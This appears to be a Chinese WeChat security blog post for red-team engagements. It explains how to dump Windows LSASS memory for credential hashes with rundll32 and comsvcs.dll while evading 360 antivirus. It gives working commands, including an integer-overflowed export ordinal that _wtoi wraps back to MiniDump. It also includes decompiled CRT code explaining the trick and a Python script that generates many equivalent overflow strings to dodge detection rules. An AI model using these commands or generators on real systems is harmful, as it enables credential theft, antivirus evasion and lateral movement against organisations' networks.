---
title: 攻防旺季 Rundll又活了 Dump Lsass免杀过最新360（附代码视频）
url: https://mp.weixin.qq.com/s/YGSVO3dVbTh0XpJyrw1lRg
source: Doonsec's feed
date: 2026-06-18
fetch_date: 2026-06-19T07:02:05.950554
---

# 攻防旺季 Rundll又活了 Dump Lsass免杀过最新360（附代码视频）

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/85F20iaJEU3Ng3YOJiapOENYZmNdOUbvNicbDtu6pRsicTGj6KStlUW7xWiaicgq1L4gCzia0olptP2sWoic5K4twZeDiaCCDym4QSnjEFAP5WRhicC6A/0?wx_fmt=jpeg)

# 攻防旺季 Rundll又活了 Dump Lsass免杀过最新360（附代码视频）

原创

Ting丶
Ting丶

Ting的安全笔记

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

首先向关注当前公众号的师傅们说声抱歉，由于目前研究的内容都便在网上公开，所以有比较长时间没有更新。

最近攻防的项目也逐渐多起来了，红队中少不了要去dump一下lsass，去获取一些hash，进一步横向。

这里分享一种目前仍然适用的“dump lsass 免杀过最新360”方法。

过去dump lsass的方法很多，例如procdump、sqldumper、createdump、avdump、rdleakdiag、rundll32等，或者直接使用mimikatz。但很多已经不免杀了

而wtoi溢出让rundll32活了

目前我们知道这种写法是可以dump lsass成功的，但是不免杀

```
rundll32 comsvcs.dll MiniDump  %LSASS_PID% dump.bin full
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/85F20iaJEU3MzUHMHjv1Lfiajk8SrHrgPEiaftO8wMia0ib3XyYZZF3X1oagQ7sMxGtJV4pWmUxzoIpuss0SXEICxT2ltux0fv7viaLvGO0s2b5hw/640?wx_fmt=png&from=appmsg)

以上有一个很明显的特征“MiniDump”这个导出函数的dump lsass的关键，所以备受杀软关注

而rundll32如果第二个参数首字符是 #，则不会当成函数名，而是解析为导出序号 ordinal

我们用IDA来看看MiniDump的导出序号是什么 是24

![](https://mmbiz.qpic.cn/mmbiz_png/85F20iaJEU3O05IiazeAlibic5j8EnVN60dfJC1herbpdp6DLH5RysZc18jzic9Xm5mKMiaFDiaFfpoTCVxa4iaTlDCeXDMlpNqbVB6CPibF64SUodJ0/640?wx_fmt=png&from=appmsg)

因此有了下面的命令

```
rundll32 comsvcs.dll '#24' %LSASS_PID% dump.bin full
```

目前火绒是没有拦截的，不过360是有拦截的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/85F20iaJEU3MNYxA1OxjI6jhyjRGqibP4k3vzGM5awXQAdExI0aNHawJAVDU7IFIOOiaE71t5TF5Culbh5bciaUZFtiaFfV3ubic0NeT2dEyVR5z0/640?wx_fmt=png&from=appmsg)

那么就引出了下面的进阶版 下面来讲解原理

```
rundll32 "C:\windows\system32\comsvcs.dll,#-9999999999999999999999999999999976"  %LSASS_PID% C:\lsass_dump.bin full
```

通过逆向发现 \_FindCommandFunction函数处理了#后面的数字 用的是wtoi![](https://mmbiz.qpic.cn/sz_mmbiz_png/85F20iaJEU3NQxsDicI2kUIdibPFFItqDj4Dowc1HFdzG1nQnI20thy4pSaHTJWGD9fcQmicyzicEPYictpxIQaVnXp4X3cL2ric2wd99Noq4Z1MS4/640?wx_fmt=png&from=appmsg)

而这个\_wtoi是一个导出函数 本身rundll32自定义的![](https://mmbiz.qpic.cn/sz_mmbiz_png/85F20iaJEU3N45mSSOUAdZI5EToxumJqqNAxxJzdOhXENUkNZ8qQvH3Jqu6zS38K7t5cA5pxNpmevF1jDI5tPCGzRYNY7cqcqn2yqBWALNYg/640?wx_fmt=png&from=appmsg)

查看exports表 可以发现是用的msvcrt.dll导出的\_wtoi

![](https://mmbiz.qpic.cn/sz_mmbiz_png/85F20iaJEU3ODLuRbqbQzPq2CoNjOLaBzgQtcY6S5cJXeWgEWoNoouduMMB1TdVh9csnLLOhNykdZJ1YzcqC7OBUkUEXDrRUk7sIZH8Wzuc8/640?wx_fmt=png&from=appmsg)

那么继续分析msvcrt.dll中的\_wtoi

![](https://mmbiz.qpic.cn/sz_mmbiz_png/85F20iaJEU3MqswfwuCcmwcwy4CxPpshtCZ2PBiaH3RERib99UAnicLe1DPaTrOEZt7VkbESzbibwWX53eSd9txvVulJV9dtwxnGmfw0IxYzD7Do/640?wx_fmt=png&from=appmsg)

真正实现\_wtoi 的函数是这个wcstoxlX

```
__int64 __fastcall wcstoxlX(struct localeinfo_struct *a1, wint_t *a2, wint_t **a3, unsigned int a4, int a5, int a6)
{
  wint_t *v9; // rbx
  wint_t v10; // bp
  unsigned int v11; // edi
  int v12; // esi
  unsigned int v13; // r13d
  unsigned int v14; // ecx
  int v15; // ecx
  wint_t *v16; // rbx
  __int64 result; // rax
  __crt_locale_pointers Locale; // [rsp+30h] [rbp-48h] BYREF
  __int64 v19; // [rsp+40h] [rbp-38h]
  char v20; // [rsp+48h] [rbp-30h]

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&Locale, a1);
  if ( a3 )
    *a3 = a2;
  if ( !a2 || a4 && a4 - 2 > 0x22 )
  {
    *errno() = 22;
    invalid_parameter(nullptr, nullptr, nullptr, 0, 0);
  }
  v9 = a2 + 1;
  *errno() = 0;
  v10 = *a2;
  v11 = 0;
  while ( iswctype_l(v10, 8u, &Locale) )
    v10 = *v9++;
  v12 = a5;
  if ( v10 == '-' )
  {
    v12 = a5 | 2;
  }
  else if ( v10 != '+' )
  {
    goto LABEL_14;
  }
  v10 = *v9++;
LABEL_14:
  if ( a4 )
  {
    if ( a4 != 16 )
      goto LABEL_24;
    goto LABEL_21;
  }
  if ( !(unsigned int)wchartodigit(v10) )
  {
    if ( ((*v9 - 88) & 0xFFDF) != 0 )
    {
      a4 = 8;
      goto LABEL_24;
    }
    a4 = 16;
LABEL_21:
    if ( !(unsigned int)wchartodigit(v10) && ((*v9 - 88) & 0xFFDF) == 0 )
    {
      v10 = v9[1];
      v9 += 2;
    }
    goto LABEL_24;
  }
  a4 = 10;
LABEL_24:
  v13 = 0xFFFFFFFF / a4;
  while ( 1 )
  {
    v14 = wchartodigit(v10);
    if ( v14 != -1 )
      goto LABEL_31;
    if ( (unsigned __int16)(v10 - 65) > 0x19u && (unsigned __int16)(v10 - 97) > 0x19u )
      break;
    v15 = v10 - 32;
    if ( (unsigned __int16)(v10 - 97) > 0x19u )
      v15 = v10;
    v14 = v15 - 55;
LABEL_31:
    if ( v14 >= a4 )
      break;
    v12 |= 8u;
    if ( a6 || v11 < v13 || v11 == v13 && v14 <= 0xFFFFFFFF % a4 )
    {
      v11 = v14 + a4 * v11;
    }
    else
    {
      v12 |= 4u;
      if ( !a3 )
        break;
    }
    v10 = *v9++;
  }
  v16 = v9 - 1;
  if ( (v12 & 8) != 0 )
  {
    if ( (v12 & 4) == 0 )
    {
      if ( (v12 & 1) != 0 )
        goto LABEL_53;
      if ( (v12 & 2) != 0 )
      {
        if ( v11 <= 0x80000000 )
          goto LABEL_53;
      }
      else if ( v11 <= 0x7FFFFFFF )
      {
        goto LABEL_53;
      }
    }
    if ( !a6 )
    {
      *errno() = 34;
      if ( (v12 & 1) != 0 )
        v11 = -1;
      else
        v11 = ((v12 & 2) != 0) + 0x7FFFFFFF;
    }
  }
  else
  {
    if ( a3 )
      v16 = a2;
    v11 = 0;
  }
LABEL_53:
  if ( a3 )
    *a3 = v16;
  result = -v11;
  if ( (v12 & 2) == 0 )
    result = v11;
  if ( v20 )
    *(_DWORD *)(v19 + 200) &= ~2u;
  return result;
}
```

那么当  -9999999999999999999999999999999976  传入之后 执行的步骤如下

* 输入字符串：负号 + 超长数字，循环持续计算无符号 32 位 v11；
* 每一步v11 = v11 \* 10 + digit，超出 32 位无符号范围自动模 2^32=4294967296；
* 全部字符计算完毕后，v11 = 24（无符号 32 位）；
* 代码走负数分支：result = -v11 = -24；
* \_wtoi 把 64 位的 -24 截断成 32 位 int，返回值 = 0xFFFFFFE8 = -24；
* 回到 rundll32 的 \_FindCommandFunction：c运行

```
v7 = _wtoi(L"-999...9976"); // v7 = -24
GetProcAddress(hMod, (LPCSTR)v7);
```

* 上层 rundll32 代码对序号取负：ordinal = -v7 = 24，成功匹配 MiniDump 导出序号。

那么是不是这样 -9999999999999999999999999999999976这样的数字可以呢？如果这个数字被加入了规则不就又失效了吗？

暂时不用担心，可以通过以下脚本一次性批量生成大量的这样的数字

![](https://mmbiz.qpic.cn/sz_mmbiz_png/85F20iaJEU3Prn7ENib5EoiaaibFTHGJic5xXpRRICDGySTjiaUnxC0A0w7YmJI4icllib9NeQrFB2WslDEFIXgAJKueBs4jbrqV2Z3KDONdOh43sibs/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/85F20iaJEU3OzMgO5dU30ZnbE1Z2HT2lFcHlvicSJAiaiaAiaM3eU1tMtmGGBwtdoicm4wNiaXrUSCV1ial8ngj1ylkCpfMDQht9UxJPAnQjdXibhbdc/640?wx_fmt=png&from=appmsg)

```
import sys

def wtoi_overflow(s: str, bits: int = 32) -> int:

    s = s.strip()
    if not s:
        return 0
    sign = 1
    idx = 0
    if s[0] == '-':
        sign = -1
        idx = 1
    elif s[0] == '+':
        idx = 1

    mask = (1 << bits) - 1
    half = 1 << (bits - 1)
    result = 0
    for ch in s[idx:]:
        if ch.isdigit():
            result = (result * 10 + int(ch)) & mask
        else:
            break

    if sign == -1:
        result = (-result) & mask

    if result >= half:
        result -= (1 << bits)
    return result

def generate_equivalent_numbers(base_str: str, count: int = 20,
                                bits: int = 32, min_digits: int = 20):

    target_overflow = wtoi_overflow(base_str, bits)
    print(f"[*] 目标溢出值: {target_overflow}")

    base_int = int(base_str)
    mod = 1 << bits

    equivalents = []

    for k in range(-count, count + 1):
        val = base_int + k * mod

        if val == 0:
            continue
        if len(str(abs(val))) >= min_digits:
            equivalents.append(str(val))
    return equivalents

if __name__ == "__main__":
    base = "-10000000000000000000000042949672936"

    if len(sys.argv) > 1:
        base = sys.argv[1]
    bits = 32
    if len(sys.argv) > 2:
        bits = int(sys.argv[2])

    print(f"使用基数: {base}, 模 2^{bits}")
    numbers = generate_equivalent_numbers(base, count=20, bits=bits,
                                          min_digits=len(base)-2)
    print(f"\n生成的等效超大数字 ({len(numbers)} 个):")
    for n in numbers:
        print(n)
```

![](https://mmbiz.qpic.cn/mmbiz_png/85F20iaJEU3Ofliciah001kQH6S5uOMkwUo7BKroK8dycPXAHJWINP6bDRuloKGc3ljFhMEnNTZQeSV7wjCoHmAz0dtXpYmVPRPoYHNpzV89Jg/640?wx_fmt=png&from=appmsg)

复现视频

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vdCg4FY0BBLqcDlPZMCjXJM008g7ib1k6y81qATEnt3wRcu6c0gvQawDMQhP20uMt3N33Mn50XHtQQ/0?wx_fmt=png)

Ting的安全笔记

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![...